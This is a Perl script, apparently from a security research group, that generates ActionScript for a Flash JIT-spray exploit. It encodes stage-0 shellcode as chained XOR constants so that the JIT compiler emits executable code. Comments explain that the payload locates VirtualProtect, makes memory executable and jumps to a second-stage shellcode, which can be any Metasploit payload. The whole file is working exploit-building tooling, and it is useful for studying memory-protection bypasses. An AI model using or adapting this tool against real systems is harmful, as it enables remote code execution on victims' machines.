#!/usr/bin/perl
#
# Shellcode2JIT.pl
# 
# by Alexey Sintsov
# DSecRG
# 

open (FI,"<UNI_STAGE0.txt");
@base=<FI>;
close(FI);

print <<EOF;
// JIT_S0.swf
//
// VirtualProtect() stage-0 shellcode
//
//        how to use stack
//
//      0000: 0x1111111   	-- ret addr to JIT satge0 shellcode
//      0004: 0x60616f62   	-- pointer on string atom (encoded high) if ret
//      0008: 0x60616f62   	-- pointer on string atom (encoded high) if ret 4
//		000c: 0x60616f62   	-- pointer on string atom (encoded high) if ret 8
//		0010: 0x6a616061   	-- pointer on string atom (encoded low)
//		0014: 0x6a616061   	-- pointer on string atom (encoded low)
//		0018: 0x6a616061   	-- pointer on string atom (encoded low)
//
//   Thiss JIT shellcode find VirtualProtect, restore address of shellcode
//   Make mem exec and jump to it.
//	 this is used for non ASCII, null and RF bytes encoding
//	
//
//   Restore function:
//	 ((high-0x60606060)<<4)+(low-0x60606060)
//   So 0x0a11f021 - original address.
// 
//   For shellcode in string use FastShellcode.pl - any payload cann be added from MetaSploit
//
//  By Alexey Sintsov
//	dookie\@inbox.ru
//	a.sintsov\@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//

package {
    import flash.display.*
	public class Loadzz2 extends MovieClip
    {
		function funcXOR1()
		{
EOF


print "\t\t\tvar jit=(0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^";
foreach $strA(@base)
{
    my $jit;
	chomp($strA);
	my $str=substr($strA,2,8);
    $jit=sprintf("%s%s%s%s%s%s%s%s",substr($str,6,1),substr($str,7,1),substr($str,4,1),substr($str,5,1),substr($str,2,1),substr($str,3,1),substr($str,0,1),substr($str,1,1));
	print "\t\t\t0x$jit";
	print "^\n";
}

print "\t\t\t0x3ccccccc);";

print <<EOF;
			
			return jit;
		}
		
		function Loadzz2()
		{
				var ret1=funcXOR1();
		}
    }
}
EOF
